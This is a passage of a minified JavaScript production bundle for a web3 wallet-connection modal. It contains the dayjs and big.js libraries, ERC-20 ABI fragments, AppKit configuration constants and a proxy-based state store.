q&&this.$d[q](W);return this.init(),this},y.set=function(E,k){return this.clone().$set(E,k)},y.get=function(E){return this[D.p(E)]()},y.add=function(E,k){var _,R=this;E=Number(E);var L=D.p(k),q=function(G){var ne=T(R);return D.w(ne.date(ne.date()+Math.round(G*E)),R)};if(L===h)return this.set(h,this.$M+E);if(L===f)return this.set(f,this.$y+E);if(L===l)return q(1);if(L===u)return q(7);var W=(_={},_[a]=n,_[c]=i,_[o]=r,_)[L]||1,Z=this.$d.getTime()+E*W;return D.w(Z,this)},y.subtract=function(E,k){return this.add(-1*E,k)},y.format=function(E){var k=this,_=this.$locale();if(!this.isValid())return _.invalidDate||p;var R=E||"YYYY-MM-DDTHH:mm:ssZ",L=D.z(this),q=this.$H,W=this.$m,Z=this.$M,G=_.weekdays,ne=_.months,de=_.meridiem,Se=function(ke,Me,Ue,Le){return ke&&(ke[Me]||ke(k,R))||Ue[Me].slice(0,Le)},Ne=function(ke){return D.s(q%12||12,ke,"0")},be=de||function(ke,Me,Ue){var Le=ke<12?"AM":"PM";return Ue?Le.toLowerCase():Le};return R.replace(m,function(ke,Me){return Me||function(Ue){switch(Ue){case"YY":return String(k.$y).slice(-2);case"YYYY":return D.s(k.$y,4,"0");case"M":return Z+1;case"MM":return D.s(Z+1,2,"0");case"MMM":return Se(_.monthsShort,Z,ne,3);case"MMMM":return Se(ne,Z);case"D":return k.$D;case"DD":return D.s(k.$D,2,"0");case"d":return String(k.$W);case"dd":return Se(_.weekdaysMin,k.$W,G,2);case"ddd":return Se(_.weekdaysShort,k.$W,G,3);case"dddd":return G[k.$W];case"H":return String(q);case"HH":return D.s(q,2,"0");case"h":return Ne(1);case"hh":return Ne(2);case"a":return be(q,W,!0);case"A":return be(q,W,!1);case"m":return String(W);case"mm":return D.s(W,2,"0");case"s":return String(k.$s);case"ss":return D.s(k.$s,2,"0");case"SSS":return D.s(k.$ms,3,"0");case"Z":return L}return null}(ke)||L.replace(":","")})},y.utcOffset=function(){return 15*-Math.round(this.$d.getTimezoneOffset()/15)},y.diff=function(E,k,_){var R,L=this,q=D.p(k),W=T(E),Z=(W.utcOffset()-this.utcOffset())*n,G=this-W,ne=function(){return D.m(L,W)};switch(q){case f:R=ne()/12;break;case h:R=ne();break;case d:R=ne()/3;break;case u:R=(G-Z)/6048e5;break;case l:R=(G-Z)/864e5;break;case c:R=G/i;break;case a:R=G/n;break;case o:R=G/r;break;default:R=G}return _?R:D.a(R)},y.daysInMonth=function(){return this.endOf(h).$D},y.$locale=function(){return C[this.$L]},y.locale=function(E,k){if(!E)return this.$L;var _=this.clone(),R=P(E,k,!0);return R&&(_.$L=R),_},y.clone=function(){return D.w(this.$d,this)},y.toDate=function(){return new Date(this.valueOf())},y.toJSON=function(){return this.isValid()?this.toISOString():null},y.toISOString=function(){return this.$d.toISOString()},y.toString=function(){return this.$d.toUTCString()},O}(),V=z.prototype;return T.prototype=V,[["$ms",s],["$s",o],["$m",a],["$H",c],["$W",l],["$M",h],["$y",f],["$D",g]].forEach(function(O){V[O[1]]=function(y){return this.$g(y,O[0],O[1])}}),T.extend=function(O,y){return O.$i||(O(y,z,T),O.$i=!0),T},T.locale=P,T.isDayjs=S,T.unix=function(O){return T(1e3*O)},T.en=C[I],T.Ls=C,T.p={},T})})(pA);var Sy=pA.exports,gA={exports:{}};(function(t,e){(function(r,n){t.exports=n()})(r1,function(){return{name:"en",weekdays:"Sunday_Monday_Tuesday_Wednesday_Thursday_Friday_Saturday".split("_"),months:"January_February_March_April_May_June_July_August_September_October_November_December".split("_"),ordinal:function(r){var n=["th","st","nd","rd"],i=r%100;return"["+r+(n[(i-20)%10]||n[i]||n[0])+"]"}}})})(gA);var Jz=gA.exports,wA={exports:{}};(function(t,e){(function(r,n){t.exports=n()})(r1,function(){return function(r,n,i){r=r||{};var s=n.prototype,o={future:"in %s",past:"%s ago",s:"a few seconds",m:"a minute",mm:"%d minutes",h:"an hour",hh:"%d hours",d:"a day",dd:"%d days",M:"a month",MM:"%d months",y:"a year",yy:"%d years"};function a(l,u,h,d){return s.fromToBase(l,u,h,d)}i.en.relativeTime=o,s.fromToBase=function(l,u,h,d,f){for(var g,p,w,m=h.$locale().relativeTime||o,b=r.thresholds||[{l:"s",r:44,d:"second"},{l:"m",r:89},{l:"mm",r:44,d:"minute"},{l:"h",r:89},{l:"hh",r:21,d:"hour"},{l:"d",r:35},{l:"dd",r:25,d:"day"},{l:"M",r:45},{l:"MM",r:10,d:"month"},{l:"y",r:17},{l:"yy",d:"year"}],v=b.length,x=0;x<v;x+=1){var I=b[x];I.d&&(g=d?i(l).diff(h,I.d,!0):h.diff(l,I.d,!0));var C=(r.rounding||Math.round)(Math.abs(g));if(w=g>0,C<=I.r||!I.r){C<=1&&x>0&&(I=b[x-1]);var N=m[I.l];f&&(C=f(""+C)),p=typeof N=="string"?N.replace("%d",C):N(C,u,I.l,w);break}}if(u)return p;var S=w?m.future:m.past;return typeof S=="function"?S(p):S.replace("%s",p)},s.to=function(l,u){return a(l,u,this,!0)},s.from=function(l,u){return a(l,u,this)};var c=function(l){return l.$u?i.utc():i()};s.toNow=function(l){return this.to(c(this),l)},s.fromNow=function(l){return this.from(c(this),l)}}})})(wA);var Qz=wA.exports,mA={exports:{}};(function(t,e){(function(r,n){t.exports=n()})(r1,function(){return function(r,n,i){i.updateLocale=function(s,o){var a=i.Ls[s];if(a)return(o?Object.keys(o):[]).forEach(function(c){a[c]=o[c]}),a}}})})(mA);var Yz=mA.exports;Sy.extend(Qz),Sy.extend(Yz);const Xz={...Jz,name:"en-web3-modal",relativeTime:{future:"in %s",past:"%s ago",s:"%d sec",m:"1 min",mm:"%d min",h:"1 hr",hh:"%d hrs",d:"1 d",dd:"%d d",M:"1 mo",MM:"%d mo",y:"1 yr",yy:"%d yr"}};Sy.locale("en-web3-modal",Xz);const yA={caipNetworkIdToNumber(t){return t?Number(t.split(":")[1]):void 0},parseEvmChainId(t){return typeof t=="string"?this.caipNetworkIdToNumber(t):t},getNetworksByNamespace(t,e){return(t==null?void 0:t.filter(r=>r.chainNamespace===e))||[]},getFirstNetworkByNamespace(t,e){return this.getNetworksByNamespace(t,e)[0]}};var ej=20,tj=1,sl=1e6,rj=1e6,nj=-7,ij=21,sj=!1,xd="[big.js] ",ac=xd+"Invalid ",kp=ac+"decimal places",oj=ac+"rounding mode",i4=xd+"Division by zero",nt={},zi=void 0,aj=/^-?(\d+(\.\d*)?|\.\d+)(e[+-]?\d+)?$/i;function bA(){function t(e){var r=this;if(!(r instanceof t))return e===zi?bA():new t(e);if(e instanceof t)r.s=e.s,r.e=e.e,r.c=e.c.slice();else{if(typeof e!="string"){if(t.strict===!0&&typeof e!="bigint")throw TypeError(ac+"value");e=e===0&&1/e<0?"-0":String(e)}cj(r,e)}r.constructor=t}return t.prototype=nt,t.DP=ej,t.RM=tj,t.NE=nj,t.PE=ij,t.strict=sj,t.roundDown=0,t.roundHalfUp=1,t.roundHalfEven=2,t.roundUp=3,t}function cj(t,e){var r,n,i;if(!aj.test(e))throw Error(ac+"number");for(t.s=e.charAt(0)=="-"?(e=e.slice(1),-1):1,(r=e.indexOf("."))>-1&&(e=e.replace(".","")),(n=e.search(/e/i))>0?(r<0&&(r=n),r+=+e.slice(n+1),e=e.substring(0,n)):r<0&&(r=e.length),i=e.length,n=0;n<i&&e.charAt(n)=="0";)++n;if(n==i)t.c=[t.e=0];else{for(;i>0&&e.charAt(--i)=="0";);for(t.e=r-n-1,t.c=[],r=0;n<=i;)t.c[r++]=+e.charAt(n++)}return t}function ea(t,e,r,n){var i=t.c;if(r===zi&&(r=t.constructor.RM),r!==0&&r!==1&&r!==2&&r!==3)throw Error(oj);if(e<1)n=r===3&&(n||!!i[0])||e===0&&(r===1&&i[0]>=5||r===2&&(i[0]>5||i[0]===5&&(n||i[1]!==zi))),i.length=1,n?(t.e=t.e-e+1,i[0]=1):i[0]=t.e=0;else if(e<i.length){if(n=r===1&&i[e]>=5||r===2&&(i[e]>5||i[e]===5&&(n||i[e+1]!==zi||i[e-1]&1))||r===3&&(n||!!i[0]),i.length=e,n){for(;++i[--e]>9;)if(i[e]=0,e===0){++t.e,i.unshift(1);break}}for(e=i.length;!i[--e];)i.pop()}return t}function ta(t,e,r){var n=t.e,i=t.c.join(""),s=i.length;if(e)i=i.charAt(0)+(s>1?"."+i.slice(1):"")+(n<0?"e":"e+")+n;else if(n<0){for(;++n;)i="0"+i;i="0."+i}else if(n>0)if(++n>s)for(n-=s;n--;)i+="0";else n<s&&(i=i.slice(0,n)+"."+i.slice(n));else s>1&&(i=i.charAt(0)+"."+i.slice(1));return t.s<0&&r?"-"+i:i}nt.abs=function(){var t=new this.constructor(this);return t.s=1,t},nt.cmp=function(t){var e,r=this,n=r.c,i=(t=new r.constructor(t)).c,s=r.s,o=t.s,a=r.e,c=t.e;if(!n[0]||!i[0])return n[0]?s:i[0]?-o:0;if(s!=o)return s;if(e=s<0,a!=c)return a>c^e?1:-1;for(o=(a=n.length)<(c=i.length)?a:c,s=-1;++s<o;)if(n[s]!=i[s])return n[s]>i[s]^e?1:-1;return a==c?0:a>c^e?1:-1},nt.div=function(t){var e=this,r=e.constructor,n=e.c,i=(t=new r(t)).c,s=e.s==t.s?1:-1,o=r.DP;if(o!==~~o||o<0||o>sl)throw Error(kp);if(!i[0])throw Error(i4);if(!n[0])return t.s=s,t.c=[t.e=0],t;var a,c,l,u,h,d=i.slice(),f=a=i.length,g=n.length,p=n.slice(0,a),w=p.length,m=t,b=m.c=[],v=0,x=o+(m.e=e.e-t.e)+1;for(m.s=s,s=x<0?0:x,d.unshift(0);w++<a;)p.push(0);do{for(l=0;l<10;l++){if(a!=(w=p.length))u=a>w?1:-1;else for(h=-1,u=0;++h<a;)if(i[h]!=p[h]){u=i[h]>p[h]?1:-1;break}if(u<0){for(c=w==a?i:d;w;){if(p[--w]<c[w]){for(h=w;h&&!p[--h];)p[h]=9;--p[h],p[w]+=10}p[w]-=c[w]}for(;!p[0];)p.shift()}else break}b[v++]=u?l:++l,p[0]&&u?p[w]=n[f]||0:p=[n[f]]}while((f++<g||p[0]!==zi)&&s--);return!b[0]&&v!=1&&(b.shift(),m.e--,x--),v>x&&ea(m,x,r.RM,p[0]!==zi),m},nt.eq=function(t){return this.cmp(t)===0},nt.gt=function(t){return this.cmp(t)>0},nt.gte=function(t){return this.cmp(t)>-1},nt.lt=function(t){return this.cmp(t)<0},nt.lte=function(t){return this.cmp(t)<1},nt.minus=nt.sub=function(t){var e,r,n,i,s=this,o=s.constructor,a=s.s,c=(t=new o(t)).s;if(a!=c)return t.s=-c,s.plus(t);var l=s.c.slice(),u=s.e,h=t.c,d=t.e;if(!l[0]||!h[0])return h[0]?t.s=-c:l[0]?t=new o(s):t.s=1,t;if(a=u-d){for((i=a<0)?(a=-a,n=l):(d=u,n=h),n.reverse(),c=a;c--;)n.push(0);n.reverse()}else for(r=((i=l.length<h.length)?l:h).length,a=c=0;c<r;c++)if(l[c]!=h[c]){i=l[c]<h[c];break}if(i&&(n=l,l=h,h=n,t.s=-t.s),(c=(r=h.length)-(e=l.length))>0)for(;c--;)l[e++]=0;for(c=e;r>a;){if(l[--r]<h[r]){for(e=r;e&&!l[--e];)l[e]=9;--l[e],l[r]+=10}l[r]-=h[r]}for(;l[--c]===0;)l.pop();for(;l[0]===0;)l.shift(),--d;return l[0]||(t.s=1,l=[d=0]),t.c=l,t.e=d,t},nt.mod=function(t){var e,r=this,n=r.constructor,i=r.s,s=(t=new n(t)).s;if(!t.c[0])throw Error(i4);return r.s=t.s=1,e=t.cmp(r)==1,r.s=i,t.s=s,e?new n(r):(i=n.DP,s=n.RM,n.DP=n.RM=0,r=r.div(t),n.DP=i,n.RM=s,this.minus(r.times(t)))},nt.neg=function(){var t=new this.constructor(this);return t.s=-t.s,t},nt.plus=nt.add=function(t){var e,r,n,i=this,s=i.constructor;if(t=new s(t),i.s!=t.s)return t.s=-t.s,i.minus(t);var o=i.e,a=i.c,c=t.e,l=t.c;if(!a[0]||!l[0])return l[0]||(a[0]?t=new s(i):t.s=i.s),t;if(a=a.slice(),e=o-c){for(e>0?(c=o,n=l):(e=-e,n=a),n.reverse();e--;)n.push(0);n.reverse()}for(a.length-l.length<0&&(n=l,l=a,a=n),e=l.length,r=0;e;a[e]%=10)r=(a[--e]=a[e]+l[e]+r)/10|0;for(r&&(a.unshift(r),++c),e=a.length;a[--e]===0;)a.pop();return t.c=a,t.e=c,t},nt.pow=function(t){var e=this,r=new e.constructor("1"),n=r,i=t<0;if(t!==~~t||t<-1e6||t>rj)throw Error(ac+"exponent");for(i&&(t=-t);t&1&&(n=n.times(e)),t>>=1,!!t;)e=e.times(e);return i?r.div(n):n},nt.prec=function(t,e){if(t!==~~t||t<1||t>sl)throw Error(ac+"precision");return ea(new this.constructor(this),t,e)},nt.round=function(t,e){if(t===zi)t=0;else if(t!==~~t||t<-1e6||t>sl)throw Error(kp);return ea(new this.constructor(this),t+this.e+1,e)},nt.sqrt=function(){var t,e,r,n=this,i=n.constructor,s=n.s,o=n.e,a=new i("0.5");if(!n.c[0])return new i(n);if(s<0)throw Error(xd+"No square root");s=Math.sqrt(+ta(n,!0,!0)),s===0||s===1/0?(e=n.c.join(""),e.length+o&1||(e+="0"),s=Math.sqrt(e),o=((o+1)/2|0)-(o<0||o&1),t=new i((s==1/0?"5e":(s=s.toExponential()).slice(0,s.indexOf("e")+1))+o)):t=new i(s+""),o=t.e+(i.DP+=4);do r=t,t=a.times(r.plus(n.div(r)));while(r.c.slice(0,o).join("")!==t.c.slice(0,o).join(""));return ea(t,(i.DP-=4)+t.e+1,i.RM)},nt.times=nt.mul=function(t){var e,r=this,n=r.constructor,i=r.c,s=(t=new n(t)).c,o=i.length,a=s.length,c=r.e,l=t.e;if(t.s=r.s==t.s?1:-1,!i[0]||!s[0])return t.c=[t.e=0],t;for(t.e=c+l,o<a&&(e=i,i=s,s=e,l=o,o=a,a=l),e=new Array(l=o+a);l--;)e[l]=0;for(c=a;c--;){for(a=0,l=o+c;l>c;)a=e[l]+s[c]*i[l-c-1]+a,e[l--]=a%10,a=a/10|0;e[l]=a}for(a?++t.e:e.shift(),c=e.length;!e[--c];)e.pop();return t.c=e,t},nt.toExponential=function(t,e){var r=this,n=r.c[0];if(t!==zi){if(t!==~~t||t<0||t>sl)throw Error(kp);for(r=ea(new r.constructor(r),++t,e);r.c.length<t;)r.c.push(0)}return ta(r,!0,!!n)},nt.toFixed=function(t,e){var r=this,n=r.c[0];if(t!==zi){if(t!==~~t||t<0||t>sl)throw Error(kp);for(r=ea(new r.constructor(r),t+r.e+1,e),t=t+r.e+1;r.c.length<t;)r.c.push(0)}return ta(r,!1,!!n)},nt[Symbol.for("nodejs.util.inspect.custom")]=nt.toJSON=nt.toString=function(){var t=this,e=t.constructor;return ta(t,t.e<=e.NE||t.e>=e.PE,!!t.c[0])},nt.toNumber=function(){var t=+ta(this,!0,!0);if(this.constructor.strict===!0&&!this.eq(t.toString()))throw Error(xd+"Imprecise conversion");return t},nt.toPrecision=function(t,e){var r=this,n=r.constructor,i=r.c[0];if(t!==zi){if(t!==~~t||t<1||t>sl)throw Error(ac+"precision");for(r=ea(new n(r),t,e);r.c.length<t;)r.c.push(0)}return ta(r,t<=r.e||r.e<=n.NE||r.e>=n.PE,!!i)},nt.valueOf=function(){var t=this,e=t.constructor;if(e.strict===!0)throw Error(xd+"valueOf disallowed");return ta(t,t.e<=e.NE||t.e>=e.PE,!0)};var _h=bA();const Op={bigNumber(t){return t?new _h(t):new _h(0)},multiply(t,e){if(t===void 0||e===void 0)return new _h(0);const r=new _h(t),n=new _h(e);return r.times(n)},formatNumberToLocalString(t,e=2){return t===void 0?"0.00":typeof t=="number"?t.toLocaleString("en-US",{maximumFractionDigits:e,minimumFractionDigits:e}):parseFloat(t).toLocaleString("en-US",{maximumFractionDigits:e,minimumFractionDigits:e})},parseLocalStringToNumber(t){return t===void 0?0:parseFloat(t.replace(/,/gu,""))}},lj=[{type:"function",name:"transfer",stateMutability:"nonpayable",inputs:[{name:"_to",type:"address"},{name:"_value",type:"uint256"}],outputs:[{name:"",type:"bool"}]},{type:"function",name:"transferFrom",stateMutability:"nonpayable",inputs:[{name:"_from",type:"address"},{name:"_to",type:"address"},{name:"_value",type:"uint256"}],outputs:[{name:"",type:"bool"}]}],uj=[{type:"function",name:"approve",stateMutability:"nonpayable",inputs:[{name:"spender",type:"address"},{name:"amount",type:"uint256"}],outputs:[{type:"bool"}]}],hj=[{type:"function",name:"transfer",stateMutability:"nonpayable",inputs:[{name:"recipient",type:"address"},{name:"amount",type:"uint256"}],outputs:[]},{type:"function",name:"transferFrom",stateMutability:"nonpayable",inputs:[{name:"sender",type:"address"},{name:"recipient",type:"address"},{name:"amount",type:"uint256"}],outputs:[{name:"",type:"bool"}]}],ve={WC_NAME_SUFFIX:".reown.id",WC_NAME_SUFFIX_LEGACY:".wcn.id",BLOCKCHAIN_API_RPC_URL:"https://rpc.walletconnect.org",PULSE_API_URL:"https://pulse.walletconnect.org",W3M_API_URL:"https://api.web3modal.org",CONNECTOR_ID:{WALLET_CONNECT:"walletConnect",INJECTED:"injected",WALLET_STANDARD:"announced",COINBASE:"coinbaseWallet",COINBASE_SDK:"coinbaseWalletSDK",SAFE:"safe",LEDGER:"ledger",OKX:"okx",EIP6963:"eip6963",AUTH:"ID_AUTH"},CONNECTOR_NAMES:{AUTH:"Auth"},AUTH_CONNECTOR_SUPPORTED_CHAINS:["eip155","solana"],LIMITS:{PENDING_TRANSACTIONS:99},CHAIN:{EVM:"eip155",SOLANA:"solana",POLKADOT:"polkadot",BITCOIN:"bip122"},CHAIN_NAME_MAP:{eip155:"EVM Networks",solana:"Solana",polkadot:"Polkadot",bip122:"Bitcoin"},ADAPTER_TYPES:{BITCOIN:"bitcoin",SOLANA:"solana",WAGMI:"wagmi",ETHERS:"ethers",ETHERS5:"ethers5"},USDT_CONTRACT_ADDRESSES:["0xdac17f958d2ee523a2206206994597c13d831ec7","0xc2132d05d31c914a87c6611c10748aeb04b58e8f","0x9702230a8ea53601f5cd2dc00fdbc13d4df4a8c7","0x919C1c267BC06a7039e03fcc2eF738525769109c","0x48065fbBE25f71C9282ddf5e1cD6D6A887483D5e","0x55d398326f99059fF775485246999027B3197955","0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9"],HTTP_STATUS_CODES:{SERVICE_UNAVAILABLE:503,FORBIDDEN:403},UNSUPPORTED_NETWORK_NAME:"Unknown Network"},dj={getERC20Abi:t=>ve.USDT_CONTRACT_ADDRESSES.includes(t)?hj:lj,getSwapAbi:()=>uj},Js={validateCaipAddress(t){var e;if(((e=t.split(":"))==null?void 0:e.length)!==3)throw new Error("Invalid CAIP Address");return t},parseCaipAddress(t){const e=t.split(":");if(e.length!==3)throw new Error(`Invalid CAIP-10 address: ${t}`);const[r,n,i]=e;if(!r||!n||!i)throw new Error(`Invalid CAIP-10 address: ${t}`);return{chainNamespace:r,chainId:n,address:i}},parseCaipNetworkId(t){const e=t.split(":");if(e.length!==2)throw new Error(`Invalid CAIP-2 network id: ${t}`);const[r,n]=e;if(!r||!n)throw new Error(`Invalid CAIP-2 network id: ${t}`);return{chainNamespace:r,chainId:n}}},_e={WALLET_ID:"@appkit/wallet_id",WALLET_NAME:"@appkit/wallet_name",SOLANA_WALLET:"@appkit/solana_wallet",SOLANA_CAIP_CHAIN:"@appkit/solana_caip_chain",ACTIVE_CAIP_NETWORK_ID:"@appkit/active_caip_network_id",CONNECTED_SOCIAL:"@appkit/connected_social",CONNECTED_SOCIAL_USERNAME:"@appkit-wallet/SOCIAL_USERNAME",RECENT_WALLETS:"@appkit/recent_wallets",DEEPLINK_CHOICE:"WALLETCONNECT_DEEPLINK_CHOICE",ACTIVE_NAMESPACE:"@appkit/active_namespace",CONNECTED_NAMESPACES:"@appkit/connected_namespaces",CONNECTION_STATUS:"@appkit/connection_status",SIWX_AUTH_TOKEN:"@appkit/siwx-auth-token",SIWX_NONCE_TOKEN:"@appkit/siwx-nonce-token",TELEGRAM_SOCIAL_PROVIDER:"@appkit/social_provider",NATIVE_BALANCE_CACHE:"@appkit/native_balance_cache",PORTFOLIO_CACHE:"@appkit/portfolio_cache",ENS_CACHE:"@appkit/ens_cache",IDENTITY_CACHE:"@appkit/identity_cache",PREFERRED_ACCOUNT_TYPES:"@appkit/preferred_account_types"};function Cw(t){if(!t)throw new Error("Namespace is required for CONNECTED_CONNECTOR_ID");return`@appkit/${t}:connected_connector_id`}const Pe={setItem(t,e){ld()&&e!==void 0&&localStorage.setItem(t,e)},getItem(t){if(ld())return localStorage.getItem(t)||void 0},removeItem(t){ld()&&localStorage.removeItem(t)},clear(){ld()&&localStorage.clear()}};function ld(){return typeof window<"u"&&typeof localStorage<"u"}function Ro(t,e){return e==="light"?{"--w3m-accent":(t==null?void 0:t["--w3m-accent"])||"hsla(231, 100%, 70%, 1)","--w3m-background":"#fff"}:{"--w3m-accent":(t==null?void 0:t["--w3m-accent"])||"hsla(230, 100%, 67%, 1)","--w3m-background":"#121313"}}const fj=Symbol(),s4=Object.getPrototypeOf,Ny=new WeakMap,pj=t=>t&&(Ny.has(t)?Ny.get(t):s4(t)===Object.prototype||s4(t)===Array.prototype),gj=t=>pj(t)&&t[fj]||null,o4=(t,e=!0)=>{Ny.set(t,e)},Aw=t=>typeof t=="object"&&t!==null,lo=new WeakMap,ud=new WeakSet,wj=(t=Object.is,e=(l,u)=>new Proxy(l,u),r=l=>Aw(l)&&!ud.has(l)&&(Array.isArray(l)||!(Symbol.iterator in l))&&!(l instanceof WeakMap)&&!(l instanceof WeakSet)&&!(l instanceof Error)&&!(l instanceof Number)&&!(l instanceof Date)&&!(l instanceof String)&&!(l instanceof RegExp)&&!(l instanceof ArrayBuffer),n=l=>{switch(l.status){case"fulfilled":return l.value;case"rejected":throw l.reason;default:throw l}},i=new WeakMap,s=(l,u,h=n)=>{const d=i.get(l);if((d==null?void 0:d[0])===u)return d[1];const f=Array.isArray(l)?[]:Object.create(Object.getPrototypeOf(l));return o4(f,!0),i.set(l,[u,f]),Reflect.ownKeys(l).forEach(g=>{if(Object.getOwnPropertyDescriptor(f,g))return;const p=Reflect.get(l,g),{enumerable:w}=Reflect.getOwnPropertyDescriptor(l,g),m={value:p,enumerable:w,configurable:!0};if(ud.has(p))o4(p,!1);else if(p instanceof Promise)delete m.value,m.get=()=>h(p);else if(lo.has(p)){const[b,v]=lo.get(p);m.value=s(b,v(),h)}Object.defineProperty(f,g,m)}),Object.preventExtensions(f)},o=new WeakMap,a=[1,1],c=l=>{if(!Aw(l))throw new Error("object required");const u=o.get(l);if(u)return u;let h=a[0];const d=new Set,f=(S,P=++a[0])=>{h!==P&&(h=P,d.forEach(T=>T(S,P)))};let g=a[1];const p=(S=++a[1])=>(g!==S&&!d.size&&(g=S,m.forEach(([P])=>{const T=P[1](S);T>h&&(h=T)})),h),w=S=>(P,T)=>{const D=[...P];D[1]=[S,...D[1]],f(D,T)},m=new Map,b=(S,P)=>{if((ng?"production":void 0)!=="production"&&m.has(S))throw new Error("prop listener already exists");if(d.size){const T=P[3](w(S));m.set(S,[P,T])}else m.set(S,[P])},v=S=>{var P;const T=m.get(S);T&&(m.delete(S),(P=T[1])==null||P.call(T))},x=S=>(d.add(S),d.size===1&&m.forEach(([P,T],D)=>{if((ng?"production":void 0)!=="production"&&T)throw new Error("remove already exists");const z=P[3](w(D));m.set(D,[P,z])}),()=>{d.delete(S),d.size===0&&m.forEach(([P,T],D)=>{T&&(T(),m.set(D,[P]))})}),I=Array.isArray(l)?[]:Object.create(Object.getPrototypeOf(l)),C=e(I,{deleteProperty(S,P){const T=Reflect.get(S,P);v(P);const D=Reflect.deleteProperty(S,P);return D&&f(["delete",[P],T]),D},set(S,P,T,D){const z=Reflect.has(S,P),V=Reflect.get(S,P,D);if(z&&(t(V,T)||o.has(T)&&t(V,o.get(T))))return!0;v(P),Aw(T)&&(T=gj(T)||T);let O=T;if(T instanceof Promise)T.then(y=>{T.status="fulfilled",T.value=y,f(["resolve",[P],y])}).catch(y=>{T.status="rejected",T.reason=y,f(["reject",[P],y])});else{!lo.has(T)&&r(T)&&(O=c(T));const y=!ud.has(O)&&lo.get(O);y&&b(P,y)}return Reflect.set(S,P,O,D),f(["set",[P],T,V]),!0}});o.set(l,C);const N=[I,p,s,x];return lo.set(C,N),Reflect.ownKeys(l).forEach(S=>{const P=Object.getOwnPropertyDescriptor(l,S);"value"in P&&(C[S]=l[S],delete P.value,delete P.writable),Object.defineProperty(I,S,P)}),C})=>[c,lo,ud,t,e,r,n,i,s,o,a],[mj]=wj();function ht(t={}){return mj(t)}function yr(t,e,r){const n=lo.get(t);(ng?"production":void 0)!=="production"&&!n&&console.warn("Please use proxy object");let i;const s=[],o=n[3];let a=!1;const c=o(l=>{s.push(l),i||(i=Promise.resolve().then(()=>{i=void 0,a&&e(s.splice(0))}))});return a=!0,()=>{a=!1,c()}}function Fd(t,e){const r=lo.get(t);(ng?"production":void 0)!=="production"&&!r&&console.warn("Please use proxy object");const[n,i,s]=r;return s(n,i(),e)}function Cc(t){return ud.add(t),t}function Tr(t,e,r,n){let i=t[e];return yr(t,()=>{const s=t[e];Object.is(i,s)||r(i=s)},n)}function yj(t){const e=ht({data:Array.from([]),has(r){return this.data.some(n=>n[0]===r)},set(r,n){const i=this.data.find(s=>s[0]===r);return i?i[1]=n:this.data.push([r,n]),this},get(r){var n;return(n=this.data.find(i=>i[0]===r))==null?void 0:n[1]},delete(r){const n=this.data.findIndex(i=>i[0]===r);return n===-1?!1:(this.data.splice(n,1),!0)},clear(){this.data.splice(0)},get size(){return this.data.length},toJSON(){return new Map(this.data)},forEach(r){this.data.forEach(n=>{r(n[1],n[0],this)})},keys(){return this.data.map(r=>r[0]).values()},values(){return this.data.map(r=>r[1]).values()},entries(){return new Map(this.data).entries()},get[Symbol.toStringTag](){return"Map"},[Symbol.iterator](){return this.entries()}});return Object.defineProperties(e,{data:{enumerable:!1},size:{enumerable:!1},toJSON:{enumerable:!1}}),Object.seal(e),e}const xw=(typeof process<"u"&&typeof r4<"u"?r4.NEXT_PUBLIC_SECURE_SITE_ORIGIN:void 0)||"https://secure.walletconnect.org",bj=[{label:"Coinbase",name:"coinbase",feeRange:"1-2%",url:"",supportedChains:["eip155"]},{label:"Meld.io",name:"meld",feeRange:"1-2%",url:"https://meldcrypto.com",supportedChains:["eip155","solana"]}],Ut={FOUR_MINUTES_MS:24e4,TEN_SEC_MS:1e4,FIVE_SEC_MS:5e3,THREE_SEC_MS:3e3,ONE_SEC_MS:1e3,SECURE_SITE:xw,SECURE_SITE_DASHBOARD:`${xw}/dashboard`,SECURE_SITE_FAVICON:`${xw}/images/favicon.png`,RESTRICTED_TIMEZONES:["ASIA/SHANGHAI","ASIA/URUMQI","ASIA/CHONGQING","ASIA/HARBIN","ASIA/KASHGAR","ASIA/MACAU","ASIA/HONG_KONG","ASIA/MACAO","ASIA/BEIJING","ASIA/HARBIN"],WC_COINBASE_PAY_SDK_CHAINS:["ethereum","arbitrum","polygon","berachain","avalanche-c-chain","optimism","celo","base"],WC_COINBASE_PAY_SDK_FALLBACK_CHAIN:"ethereum",WC_COINBASE_PAY_SDK_CHAIN_NAME_MAP:{Ethereum:"ethereum","Arbitrum One":"arbitrum",Polygon:"polygon",Berachain:"berachain",Avalanche:"avalanche-c-chain","OP Mainnet":"optimism",Celo:"celo",Base:"base"},WC_COINBASE_ONRAMP_APP_ID:"bf18c88d-495a-463b-b249-0b9d3656cf5e",SWAP_SUGGESTED_TOKENS:["ETH","UNI","1INCH","AAVE","SOL","ADA","AVAX","DOT","LINK","NITRO","GAIA","MILK","TRX","NEAR","GNO","WBTC","DAI","WETH","USDC","USDT","ARB","BAL","BICO","CRV","ENS","MATIC","OP"],SWAP_POPULAR_TOKENS:["ETH","UNI","1INCH","AAVE","SOL","ADA","AVAX","DOT","LINK","NITRO","GAIA","MILK","TRX","NEAR","GNO","WBTC","DAI","WETH","USDC","USDT","ARB","BAL","BICO","CRV","ENS","MATIC","OP","METAL","DAI","CHAMP","WOLF","SALE","BAL","BUSD","MUST","BTCpx","ROUTE","HEX","WELT","amDAI","VSQ","VISION","AURUM","pSP","SNX","VC","LINK","CHP","amUSDT","SPHERE","FOX","GIDDY","GFC","OMEN","OX_OLD","DE","WNT"],BALANCE_SUPPORTED_CHAINS:["eip155","solana"],SWAP_SUPPORTED_NETWORKS:["eip155:1","eip155:42161","eip155:10","eip155:324","eip155:8453","eip155:56","eip155:137","eip155:100","eip155:43114","eip155:250","eip155:8217","eip155:1313161554"],NAMES_SUPPORTED_CHAIN_NAMESPACES:["eip155"],ONRAMP_SUPPORTED_CHAIN_NAMESPACES:["eip155","solana"],ACTIVITY_ENABLED_CHAIN_NAMESPACES:["eip155"],NATIVE_TOKEN_ADDRESS:{eip155:"0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",solana:"So11111111111111111111111111111111111111111",polkadot:"0x",bip122:"0x"},CONVERT_SLIPPAGE_TOLERANCE:1,CONNECT_LABELS:{MOBILE:"Open and continue in a new browser tab"},DEFAULT_FEATURES:{swaps:!0,onramp:!0,receive:!0,send:!0,email:!0,emailShowWallets:!0,socials:["google","x","discord","farcaster","github","apple","facebook"],connectorTypeOrder:["walletConnect","recent","injected","featured","custom","external","recommended"],history:!0,analytics:!0,allWallets:!0,legalCheckbox:!1,smartSessions:!1,collapseWallets:!1,walletFeaturesOrder:["onramp","swaps","receive","send"],connectMethodsOrder:void 